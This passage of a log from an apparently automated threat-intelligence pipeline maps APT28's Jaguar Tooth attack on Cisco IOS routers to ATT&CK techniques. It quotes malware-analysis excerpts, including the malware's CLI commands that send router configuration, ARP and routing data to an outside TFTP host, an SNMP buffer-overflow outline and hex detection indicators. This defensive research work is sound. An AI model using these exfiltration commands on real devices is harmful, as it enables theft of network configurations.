A Cisco IOS router with a vulnerability exploited by the malware.
, due to similarity with: 
A Cisco IOS router is vulnerable to exploitation.
 (tensor([[0.8515]]))
[2025-03-27 12:12:30,801 INFO] ++ Removed pre-condition: 
The malware is running on the compromised Cisco IOS router.
, due to similarity with: 
The malware has successfully infiltrated the target Cisco IOS router.
 (tensor([[0.8891]]))
[2025-03-27 12:12:39,527 INFO] + Processing action: Data from Configuration Repository: Network Device Configuration Dump as used by the malware
[2025-03-27 12:12:41,088 INFO] ++ Embedding computed for: Data from Configuration Repository: Network Device Configuration Dump as used by the malware. The vector has shape: (384,)
[2025-03-27 12:12:41,104 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [adversary-in-the-middle]: tensor([[0.3158]])
[2025-03-27 12:12:41,116 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [adversary-in-the-middle: llmnr/nbt-ns poisoning and smb relay]: tensor([[0.2521]])
[2025-03-27 12:12:41,126 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [adversary-in-the-middle: arp cache poisoning]: tensor([[0.3313]])
[2025-03-27 12:12:41,142 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [adversary-in-the-middle: dhcp spoofing]: tensor([[0.3254]])
[2025-03-27 12:12:41,152 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [adversary-in-the-middle: evil twin]: tensor([[0.3164]])
[2025-03-27 12:12:41,163 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [archive collected data]: tensor([[0.2068]])
[2025-03-27 12:12:41,175 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [archive collected data: archive via utility]: tensor([[0.2496]])
[2025-03-27 12:12:41,186 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [archive collected data: archive via library]: tensor([[0.1542]])
[2025-03-27 12:12:41,197 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [archive collected data: archive via custom method]: tensor([[0.1634]])
[2025-03-27 12:12:41,211 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [audio capture]: tensor([[0.1905]])
[2025-03-27 12:12:41,222 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [automated collection]: tensor([[0.3204]])
[2025-03-27 12:12:41,233 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [browser session hijacking]: tensor([[0.2048]])
[2025-03-27 12:12:41,243 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [clipboard data]: tensor([[0.3548]])
[2025-03-27 12:12:41,252 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from cloud storage]: tensor([[0.2811]])
[2025-03-27 12:12:41,264 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from configuration repository]: tensor([[0.4489]])
[2025-03-27 12:12:41,275 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from configuration repository: snmp (mib dump)]: tensor([[0.4320]])
[2025-03-27 12:12:41,287 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from configuration repository: network device configuration dump]: tensor([[0.7073]])
[2025-03-27 12:12:41,303 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from information repositories]: tensor([[0.2490]])
[2025-03-27 12:12:41,315 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from information repositories: confluence]: tensor([[0.2713]])
[2025-03-27 12:12:41,325 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from information repositories: sharepoint]: tensor([[0.2593]])
[2025-03-27 12:12:41,338 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from information repositories: code repositories]: tensor([[0.2147]])
[2025-03-27 12:12:41,349 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from information repositories: customer relationship management software]: tensor([[0.1785]])
[2025-03-27 12:12:41,359 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from information repositories: messaging applications]: tensor([[0.2733]])
[2025-03-27 12:12:41,369 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from local system]: tensor([[0.4012]])
[2025-03-27 12:12:41,380 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from network shared drive]: tensor([[0.3533]])
[2025-03-27 12:12:41,391 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from removable media]: tensor([[0.3464]])
[2025-03-27 12:12:41,403 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data staged]: tensor([[0.3040]])
[2025-03-27 12:12:41,416 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data staged: local data staging]: tensor([[0.2989]])
[2025-03-27 12:12:41,430 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data staged: remote data staging]: tensor([[0.2891]])
[2025-03-27 12:12:41,443 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [email collection]: tensor([[0.0873]])
[2025-03-27 12:12:41,455 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [email collection: local email collection]: tensor([[0.1871]])
[2025-03-27 12:12:41,468 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [email collection: remote email collection]: tensor([[0.1122]])
[2025-03-27 12:12:41,485 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [email collection: email forwarding rule]: tensor([[0.0538]])
[2025-03-27 12:12:41,498 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [input capture]: tensor([[0.1973]])
[2025-03-27 12:12:41,511 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [input capture: keylogging]: tensor([[0.2550]])
[2025-03-27 12:12:41,523 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [input capture: gui input capture]: tensor([[0.2662]])
[2025-03-27 12:12:41,542 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [input capture: web portal capture]: tensor([[0.3149]])
[2025-03-27 12:12:41,555 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [input capture: credential api hooking]: tensor([[0.2713]])
[2025-03-27 12:12:41,570 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [screen capture]: tensor([[0.2556]])
[2025-03-27 12:12:41,583 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [video capture]: tensor([[0.2131]])
[2025-03-27 12:12:41,584 INFO] ++ Scores: [('data from configuration repository: network device configuration dump', tensor([[0.7073]])), ('data from configuration repository', tensor([[0.4489]])), ('data from configuration repository: snmp (mib dump)', tensor([[0.4320]])), ('data from local system', tensor([[0.4012]])), ('clipboard data', tensor([[0.3548]]))]
[2025-03-27 12:12:41,584 INFO] ++ Similar techniques found:
['data from configuration repository: network device configuration dump', 'data from configuration repository', 'data from configuration repository: snmp (mib dump)', 'data from local system', 'clipboard data']
[2025-03-27 12:12:41,584 INFO] ++ Querying the QA model for action Data from Configuration Repository: Network Device Configuration Dump as used by the malware with the following context:
data from configuration repository: network device configuration dump
data from configuration repository
data from configuration repository: snmp (mib dump)
data from local system
clipboard data
[2025-03-27 12:12:42,515 INFO] ++ QA suggested technique: data from configuration repository: network device configuration dump
[2025-03-27 12:12:42,516 INFO] ++ Selected technique: data from configuration repository: network device configuration dump
[2025-03-27 12:12:46,567 INFO] ++ Refining the action: Data from Configuration Repository: Network Device Configuration Dump as used by the malware using 9 documents:
[Document(id='5a640bf5-7c7f-4f53-a572-697f449bc2cc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='For detailed TTPs , see the M alware Analysis R eport .\n\nTactic  ID Technique  Procedure  \nInitial \nAccess  T1190  Exploit Public -\nfacing \nApplication.\n\nAPT28 exploited \ndefault/well-known \ncommunity strings in \nSNMP as outlined in \nCVE-2017-6742 (Cisco \nBug ID: CSCve54313 ).\n\nInitial \nAccess  T1078.001  Valid Accounts.\n\nDefault Accounts.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='259e689e-566c-4ddd-8506-bb496b2fd19a', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='r, command : \n \n• sleep 5000  \n• enable \n• sh run | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ver | r tftp:// [IP ADDRESS] /[URL PAGE] \n• sleep 5000  \n• sh ip int bri | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh arp | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh cdp neig | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh start | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ip ro  | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh fla | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• disable \n• tclquit    \n \nSNMP exploit  \nOverview  \nJaguar Tooth is deployed via exploitation of the patched  SNMP vulnerability  CVE-2017 -6742 .'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='It defines a message format for communication between SNMP managers and agents.An SNMP agent gathers data from the SNMP MIB, which is the repository of information about device parameters and network data.\n\nIt also responds to requests from an SNMP manager to get or set data.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='This included a small number based in Europe, US government institutions and approximately 250 Ukrainian victims.SNMP is designed to allow network administrators to monitor and configure network devices remotely, but it can also be misused to obtain sensitive network information and, if vulnerable, exploit devices to penetrate a network.A number of software tools can scan the entire network using SNMP, meaning that poor configuration such as using default or easy-to-guess community strings, can make a network susceptible to attacks.Weak SNMP community strings, including the default "public," allowed APT28 to gain access to router information.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='A number of software tools can scan the entire network using SNMP, meaning that poor configuration such as using default or easy -to-guess community strings, can \nmake a network susceptible to attacks.\n\nWeak SNMP community strings, including the default “ public ,” allowed APT28 to \ngain access to router information.\n\nAPT28 sent additional SNMP commands to enumerate router interfaces.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='While SNMP is still widely used for its simplicity and compatibility with older network devices, the security benefits of NETCONF and RESTCONF make them more suitable for modern network management.When you consider the security of a network device, it is critical that the management plane be protected.')]
[2025-03-27 12:13:08,006 INFO] ++ Pre-conditions computed for action: Data from Configuration Repository: Network Device Configuration Dump as used by the malware using 9 documents:
[Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(id='6bfad2ef-5d32-479f-acf4-c14fdd72cb7f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='See the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.\n\nJaguar Tooth  is deployed by writing custom shellcode  to memory which can be used to write an \narbitrary 4 -byte value to any specified address.\n\nThis shellcode is then called repeatedly to \nincrementally write Jaguar Tooth into memory.'), Document(id='f0c4291c-5307-4bd7-8ce1-1612b0f4cadc', metadata={'source': './documents\\other\\NVD - cve-2017-6742.html'}, page_content='CVSS information contributed by other sources is also\n                                            displayed.CVSS 4.0 Severity and Vector Strings:NIST:NVDN/ANVD assessment\n                                       not yet provided.CVSS 3.x Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:8.8 HIGHVector:CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:HCVSS 2.0 Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:9.0 HIGHVector:(AV:N/AC:L/Au:S/C:C/I:C/A:C)References to Advisories, Solutions, and ToolsBy selecting these links, you will be leaving NIST webspace.'), Document(id='26ab1793-df1a-4242-87f3-3ecc9d1e049f', metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.Subscribe to Cisco Security NotificationsSubscribeAction Links for This AdvisorySnort Rule 43424Snort Rule 43425Snort Rule 43426Snort Rule 43427Snort Rule 43428Snort Rule 43429Snort Rule 43430Snort Rule 43431Snort Rule 43432Cisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionShow All 18...Related to This Advisory'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='Proper patch management for infrastructure devices reduces the risk of exploitation.The following resources include numerous best practices on how to harden infrastructure devices, perform integrity assurance checks, and provide guidance on how to perform forensic investigations:Cisco Guide to Harden Cisco IOS DevicesCisco Security Indicators of Compromise Reference GuideTelemetry-Based Infrastructure Device Integrity MonitoringCisco IOS Software Forensic Investigation Procedures for First RespondersCisco IOS XE Software Forensic Investigation Procedures for First RespondersCisco IOS Software Integrity AssuranceCisco IOS XE Software Integrity AssuranceCisco recognizes the technology vendor’s role in protecting customers and won’t shy away from our responsibility to constantly provide you with up-to-date information, as well as guidance on how to protect your network against cyber-attacks.For additional guidance and information, visit the below resources:Network Resilienceresources on theCisco Trust Center.We’d love to hear what you think.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .')]
[2025-03-27 12:13:22,598 INFO] ++ Post-conditions computed for action: Data from Configuration Repository: Network Device Configuration Dump as used by the malware using 9 documents:
[Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='986b3c08-ec72-40b9-979a-ab33aab77dfc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.\n\nWhere possible, use modern encrypted protocols such as SSH and SNMP v3.\n\nHarden the encryption protocols based on current best security practice.\n\nThe \nNCSC strongly advise s owners and operators to retire and replace legacy \ndevices that can’t be configured to use SNMP v3.'), Document(id='f0858101-9ec3-4309-965b-ba52ca16747b', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='Proper patch management for infrastructure devices reduces the risk of exploitation.The following resources include numerous best practices on how to harden infrastructure devices, perform integrity assurance checks, and provide guidance on how to perform forensic investigations:Cisco Guide to Harden Cisco IOS DevicesCisco Security Indicators of Compromise Reference GuideTelemetry-Based Infrastructure Device Integrity MonitoringCisco IOS Software Forensic Investigation Procedures for First RespondersCisco IOS XE Software Forensic Investigation Procedures for First RespondersCisco IOS Software Integrity AssuranceCisco IOS XE Software Integrity AssuranceCisco recognizes the technology vendor’s role in protecting customers and won’t shy away from our responsibility to constantly provide you with up-to-date information, as well as guidance on how to protect your network against cyber-attacks.For additional guidance and information, visit the below resources:Network Resilienceresources on theCisco Trust Center.We’d love to hear what you think.')]
[2025-03-27 12:13:30,495 INFO] ++ Indicators computed for action: Data from Configuration Repository: Network Device Configuration Dump as used by the malware. The indicators are:
['The content " | 2 b   0 6   0 1   0 4   0 1   0 9   0 9   5 f   0 1   0 2   0 4   0 1   0 3 |" is transmitted.', 'The content "| 0 3   8 1   6 0   0 0   0 8 |" is transmitted.', 'The content "| 2 4   0 2   0 0   0 1 |" is transmitted.']
[2025-03-27 12:13:30,539 INFO] ++ Removed pre-condition: 
A Cisco IOS device with a running configuration.
, due to similarity with: 
The target network device is running Cisco IOS software.
 (tensor([[0.7048]]))
[2025-03-27 12:13:30,599 INFO] ++ Removed pre-condition: 
Network connectivity between the malware and the target device.
, due to similarity with: 
The malware has access to the target network device.
 (tensor([[0.8633]]))
[2025-03-27 12:13:35,821 INFO] Processing step relative to tactic: exfiltration
[2025-03-27 12:13:35,821 INFO] + Processing action: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware
[2025-03-27 12:13:39,230 INFO] ++ Embedding computed for: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware. The vector has shape: (384,)
[2025-03-27 12:13:39,267 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [automated exfiltration]: tensor([[0.6720]])
[2025-03-27 12:13:39,283 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [automated exfiltration: traffic duplication]: tensor([[0.5545]])
[2025-03-27 12:13:39,295 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [data transfer size limits]: tensor([[0.4748]])
[2025-03-27 12:13:39,305 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over alternative protocol]: tensor([[0.7126]])
[2025-03-27 12:13:39,316 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over alternative protocol: exfiltration over symmetric encrypted non-c2 protocol]: tensor([[0.7525]])
[2025-03-27 12:13:39,327 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over alternative protocol: exfiltration over asymmetric encrypted non-c2 protocol]: tensor([[0.7536]])
[2025-03-27 12:13:39,338 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol]: tensor([[0.7716]])
[2025-03-27 12:13:39,348 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over c2 channel]: tensor([[0.6529]])
[2025-03-27 12:13:39,359 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over other network medium]: tensor([[0.6107]])
[2025-03-27 12:13:39,371 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over other network medium: exfiltration over bluetooth]: tensor([[0.6696]])
[2025-03-27 12:13:39,384 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over physical medium]: tensor([[0.5835]])
[2025-03-27 12:13:39,396 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over physical medium: exfiltration over usb]: tensor([[0.6027]])
[2025-03-27 12:13:39,408 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over web service]: tensor([[0.5412]])
[2025-03-27 12:13:39,422 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over web service: exfiltration to code repository]: tensor([[0.4952]])
[2025-03-27 12:13:39,436 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over web service: exfiltration to cloud storage]: tensor([[0.5218]])
[2025-03-27 12:13:39,447 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over web service: exfiltration to text storage sites]: tensor([[0.5550]])
[2025-03-27 12:13:39,465 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [exfiltration over web service: exfiltration over webhook]: tensor([[0.4982]])
[2025-03-27 12:13:39,477 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [scheduled transfer]: tensor([[0.5242]])
[2025-03-27 12:13:39,489 INFO] ++ Similarity between [Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware] and [transfer data to cloud account]: tensor([[0.3021]])
[2025-03-27 12:13:39,491 INFO] ++ Scores: [('exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol', tensor([[0.7716]])), ('exfiltration over alternative protocol: exfiltration over asymmetric encrypted non-c2 protocol', tensor([[0.7536]])), ('exfiltration over alternative protocol: exfiltration over symmetric encrypted non-c2 protocol', tensor([[0.7525]])), ('exfiltration over alternative protocol', tensor([[0.7126]])), ('automated exfiltration', tensor([[0.6720]]))]
[2025-03-27 12:13:39,491 INFO] ++ Similar techniques found:
['exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol', 'exfiltration over alternative protocol: exfiltration over asymmetric encrypted non-c2 protocol', 'exfiltration over alternative protocol: exfiltration over symmetric encrypted non-c2 protocol', 'exfiltration over alternative protocol', 'automated exfiltration']
[2025-03-27 12:13:39,491 INFO] ++ Querying the QA model for action Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware with the following context:
exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol
exfiltration over alternative protocol: exfiltration over asymmetric encrypted non-c2 protocol
exfiltration over alternative protocol: exfiltration over symmetric encrypted non-c2 protocol
exfiltration over alternative protocol
automated exfiltration
[2025-03-27 12:13:40,847 INFO] ++ QA suggested technique: exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol
[2025-03-27 12:13:40,847 INFO] ++ Selected technique: exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol
[2025-03-27 12:13:45,174 INFO] ++ Refining the action: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware using 9 documents:
